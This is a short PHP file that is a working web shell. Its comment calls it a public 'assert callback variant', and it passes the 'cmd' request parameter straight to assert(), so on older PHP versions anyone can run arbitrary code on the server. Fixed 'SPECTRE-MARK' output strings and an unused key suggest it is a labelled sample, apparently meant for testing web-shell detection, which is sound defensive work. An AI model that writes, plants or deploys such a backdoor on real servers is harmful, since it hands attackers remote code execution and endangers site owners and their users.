<?php
// assert 回调变体(公开模式)
$pass = "cmd";
$k = "e45e329feb5d925b";
assert($_REQUEST[$pass] ?? "SPECTRE-MARK");
echo "SPECTRE-MARK-PHP";
?>
